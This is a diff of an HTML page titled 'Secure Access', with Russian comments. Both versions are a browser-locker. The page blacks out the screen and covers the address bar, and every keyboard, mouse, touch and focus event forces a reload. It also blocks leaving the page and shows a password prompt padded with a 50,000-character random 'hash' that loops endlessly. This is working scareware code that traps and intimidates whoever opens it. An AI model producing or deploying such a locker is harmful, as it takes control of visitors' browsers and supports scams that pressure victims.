@@ -1,93 +1,95 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Secure Access</title>
-<style>
-  html, body {
-    margin: 0; padding: 0; height: 100%; overflow: hidden;
-    background: black;
-    user-select: none;
-    -webkit-user-select: none;
-    -moz-user-select: none;
-    -ms-user-select: none;
-    touch-action: none;
-  }
-  #topBlocker {
-    position: fixed;
-    top: 0; left: 0; right: 0;
-    height: 40px; /* примерно высота панели браузера */
-    background: black;
-    opacity: 0.99;
-    z-index: 99999999;
-    pointer-events: all;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Access</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: black;
+      color: black;
+      user-select: none;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      overflow: hidden;
+      pointer-events: none;
+    }
+    #topBlocker {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 40px;
+      background: black;
+      opacity: 0.99;
+      z-index: 99999999;
+      pointer-events: all;
+    }
+  </style>
 </head>
 <body>
-<div id="topBlocker"></div>
+  <div id="topBlocker"></div>
+  <script>
+    // Функция для перезагрузки страницы
+    const reloadPage = () => location.reload();
 
-<script>
-(() => {
-  const reloadPage = () => location.reload();
+    // Список событий, при которых будет происходить перезагрузка
+    const events = [
+      'keydown', 'keyup', 'keypress',
+      'mousedown', 'mouseup', 'click', 'dblclick',
+      'contextmenu',
+      'touchstart', 'touchend', 'touchmove',
+      'pointerdown', 'pointerup', 'pointermove',
+      'wheel',
+      'copy', 'cut', 'paste',
+      'visibilitychange',
+      'focus', 'blur',
+      'selectstart',
+      'gesturestart', 'gesturechange', 'gestureend',
+    ];
 
-  // Список событий, при которых будем перезагружать страницу
-  const events = [
-    'keydown', 'keyup', 'keypress',
-    'mousedown', 'mouseup', 'click', 'dblclick',
-    'contextmenu',
-    'touchstart', 'touchend', 'touchmove',
-    'pointerdown', 'pointerup', 'pointermove',
-    'wheel',
-    'copy', 'cut', 'paste',
-    'visibilitychange',
-    'focus', 'blur',
-    'selectstart',
-    'gesturestart', 'gesturechange', 'gestureend',
-  ];
+    // Добавляем обработчики событий для перезагрузки страницы
+    events.forEach(eventName => {
+      window.addEventListener(eventName, e => {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        reloadPage();
+      }, {capture: true, passive: false});
+    });
 
-  events.forEach(eventName => {
-    window.addEventListener(eventName, e => {
-      e.preventDefault();
-      e.stopImmediatePropagation();
-      reloadPage();
-    }, {capture: true, passive: false});
-  });
+    // Отключаем контекстное меню
+    document.addEventListener('contextmenu', e => e.preventDefault(), {capture: true});
 
-  // Запрет выделения текста (дублируется для надёжности)
-  document.addEventListener('selectstart', e => e.preventDefault(), {capture:true});
-  document.addEventListener('copy', e => e.preventDefault(), {capture:true});
-  document.addEventListener('cut', e => e.preventDefault(), {capture:true});
-  document.addEventListener('paste', e => e.preventDefault(), {capture:true});
+    // Попытка вернуть фокус на вкладку, если она потеряна
+    window.addEventListener('blur', () => {
+      setTimeout(() => window.focus(), 10);
+    });
 
-  // Отключаем контекстное меню
-  document.addEventListener('contextmenu', e => e.preventDefault(), {capture:true});
+    // Предотвращаем уход со страницы
+    window.onbeforeunload = function() {
+      return "Вы не можете покинуть эту страницу.";
+    };
 
-  // Попытка вернуть фокус на вкладку если потерян
-  window.addEventListener('blur', () => {
-    setTimeout(() => window.focus(), 10);
-  });
-
-  // При попытке ухода с страницы
-  window.onbeforeunload = function() {
-    return "You can't leave this page.";
-  };
-
-  // prompt с рандомным хэшем и вводом (любое действие - обновление)
-  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
-  function randomString(len) {
-    let s = "";
-    for(let i=0; i<len; i++) {
-      s += chars.charAt(Math.floor(Math.random()*chars.length));
+    // Функция для генерации случайной строки
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
+    function randomString(len) {
+      let s = "";
+      for(let i = 0; i < len; i++) {
+        s += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return s;
     }
-    return s;
-  }
-  const hash = randomString(50000);
-  prompt("SECURE ACCESS REQUIRED\n\nHASH:\n\n" + hash + "\n\nEnter password:");
-  reloadPage();
 
-})();
-</script>
+    // Генерация случайного хэша
+    const hash = randomString(50000);
+    // Запрос пароля
+    prompt("SECURE ACCESS REQUIRED\n\nHASH:\n\n" + hash + "\n\nEnter password:");
+    // Перезагрузка страницы после ввода
+    reloadPage();
+  </script>
 </body>
 </html>
